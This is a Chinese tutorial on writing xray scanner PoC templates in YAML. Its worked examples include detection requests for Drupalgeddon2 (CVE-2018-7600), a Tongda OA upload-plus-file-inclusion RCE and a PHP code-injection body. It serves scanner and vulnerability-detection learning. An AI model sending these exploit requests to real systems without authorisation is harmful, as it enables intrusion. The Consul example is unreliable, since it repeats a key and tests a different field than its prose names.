# 前置知识

总结一下xray官方poc编写规则：https://zhuanlan.zhihu.com/p/78334648

## 基本的poc结构

```yaml
name: poc-yaml-example-com
rules:
  - method: GET
    path: "/"
    expression: |
      status==200 && body.bcontains(b'Example Domain')
```



整个poc包含三个键值对：

```
name: string                 poc名称如：poc-yaml-tongda-oa-rce
rules: []Rule								 poc规则：poc请求路径，请求内容，回显信息都由此匹配
detail: map[string]string		 发送给xray的信息，就是平时xray扫描得到漏洞时xray返回的那一串爆红信息
```



## rulers规则

三个键值对中最重要的就是rules键值对，下面简单介绍一下编写规则：

```
method: string 请求方法
path: string 请求的完整Path，包括querystring等
headers: map[string]string 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中
body: string 请求的Body
follow_redirects: bool 是否允许跟随300跳转
expression: string
search: string
```



根据这些键的作用，我们将其分为三类：

1. `method`、`path`、`headers`、`body`、`follow_redirects`的作用是生成检测漏洞的数据包
2. `expression`的作用是判断该条Rule的结果
3. `search`的作用是从返回包中提取信息



## xray对于POC扫描的流程如下：

POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的`method`、`path`、`headers`、`body`、`follow_redirects`键值，替换原始数据包中的对应信息。



替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；

同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。



## expression表达式编写

样例：

```
status==200 && body.bcontains(b'Example Domain')
```



函数简单总结一下即是：

```
body.contains('string'): 判断响应包中是否含有string字符串
body.bcontains(b'\x00\x01\x02'):判断body中是否包含0x000102这段二进制代码

r'^test'.matches(body):判断响应包是否以test开头，这里也可以用:body.startsWith('test')来代替。
r'^PK\x03\x04'.bmatches(body)：判断响应包是否以PK0x0304开头,PK0x0304为zip文件的16进制头

body.startsWith('test'):判断响应包是否以字符串test开头
body.endsWith('test'):判断响应包是否以字符串test结尾
```



官方样列：

```
body.bcontains(b'test')
返回包body包含test，因为body是一个bytes类型的变量，所以我们需要使用bcontains方法，且其参数也是bytes

content_type.contains('application/octet-stream') && body.bcontains(b'\x00\x01\x02')
返回包的content-type包含“application/octet-stream”，且body中包含0x000102这段二进制串

content_type.contains('zip') && r'^PK\x03\x04'.bmatches(body)
这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type包含关键字“zip”，且body匹配上正则r’^PK\x03\x04’（就是zip的文件头）。因为startsWith方法只支持字符串的判断，所以这里没有使用。

status >= 300 && status < 400
返回包的status code在300~400之间

(status >= 500 && status != 502) || r'<input value="(.+?)"'.bmatches(body)
返回包status code大于等于500且不等于502，或者Body包含表单
```



官方注意声明：

```
'\r\n' 表示换行
r'\r\n' 不表示换行，仅仅表示这4个字符。在编写正则时很有意义。
b'test' 一个字节流（bytes），在golang中即为[]byte

expression表达式返回的必须是一个bool类型的结果，这个结果作为整个Rule的值，而rules由多个Rule组成。值为true的Rule，如果后面还有其他Rule，则继续执行后续Rule，如果后续没有其他Rule，则表示该POC的结果是true；如果一个Rule的expression返回false，则不再执行后续Rule，也表示本POC的返回结果是false。

```

**`也就是说，一个POC的rules中，最后一个Rule的值，决定是否存在漏洞。`**



## search的作用

一个Rule中，可以支持使用search来查找返回包中的内容；当然，如果不需要查找内容，则可以忽略search。

search是一个字符串类型的正则表达式，我们用一个简单的案例来进行说明。如：

```
 search: |
      <input type="hidden" name="csrftoken" value="(.+?)"
```

该处表示匹配从 <input type="hidden"开头的html文本中提取csrftoken值。

```
search: |
      name="form_build_id"\s+value="(.+?)"
```

该处则表示从响应中提取form_build_id值。

```
search: (?P<dirname>200\d)_(?P<filename>\d+)
```

该处则表示从响应中提取dirname，filename。

匹配响应中_相连的两个字符，并单独获取匹配结果。?P获取匹配值，/d确定字符边界。



# poc示例

可以直接在xray的官方仓库查看大佬们编写的poc,学习一下是如何写的poc

https://github.com/chaitin/xray/tree/master/pocs

网上的一些poc例子：

```yaml
name: poc-yaml-example-com
rules:
  - method: GET
    path: "/update"
    expression: "true"
    search: |
      <input type="hidden" name="csrftoken" value="(.+?)"
  - method: POST
    path: "/update"
    body: |
      id=';echo(md5(123));//&csrftoken={{1}}
    expression: |
      status == 200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')
```



**Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600**

```yaml
name: poc-yaml-drupal-drupalgeddon2-rce
rules:
  - method: POST
    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
    body: |
      form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
    search: |
      name="form_build_id"\s+value="(.+?)"
    expression: |
      status==200
  - method: POST
    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
    body: |
      form_build_id={{1}}
    expression: |
      body.bcontains(b'test%test')
detail:
  drupal_version: 7
```



**通达OA-RCE-POC示例**

```yaml
name: poc-yaml-tongda-oa-rce
set:
  rand: randomInt(200000000, 210000000)
rules:
  - method: POST
    path: /ispirit/im/upload.php
    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
      Content-Type: >-
        multipart/form-data;charset=utf-8;boundary=---------------------------27723940316706158781839860668
      Accept-Encoding: 'deflate'
    body: |-
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
      Content-Type: image/jpeg

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="P"

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="DEST_UID"

      {{rand}}
      -----------------------------27723940316706158781839860668
      Content-Disposition: form-data; name="UPLOAD_MODE"

      1
      -----------------------------27723940316706158781839860668
    follow_redirects: false
    expression: |
      response.status == 200
    search: (?P<dirname>200\d)_(?P<filename>\d+)
  - method: POST
    path: /ispirit/interface/gateway.php
    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
      Content-Type: 'application/x-www-form-urlencoded'
      Accept-Encoding: 'deflate'
    body: |
        json={"url":"../../../general/../attach/im/{{dirname}}/{{filename}}.jpg"}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(rand)))
detail:
  author: 清风明月(www.secbook.info)
  demo_tongda_version: 'tongda-oa-11.3'
  links:
    - https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe
    - https://www.anquanke.com/post/id/201174
    - https://github.com/fuhei/tongda_rce/blob/master/tongda_rce.py

```



# 编写测试

高效率编写poc学习文章：
https://docs.xray.cool/#/guide/high_quality_poc

https://paper.seebug.org/9/



这里简单编写一下某src发现的**Consul Service API远程命令执行漏洞**

该漏洞访问/v1/agent/self路径，响应中EnableLocalScriptChecks": true即可大概率判断存在远程命令执行漏洞,非常容易写poc进行判断

```yaml
name: poc-yaml-ConsulServiceApi_rce
rules:
  - method: GET
    path: "/v1/agent/self"
    expression: "true"
    expression: |
      status == 200 && body.contains(b'"EnableRemoteScriptChecks": true')
```

漏洞详情：https://www.imzzj.com/2019/07/04/hashicorp-consul-service-api-yuan-cheng-ming-ling-zhi-xing-lou-dong.html









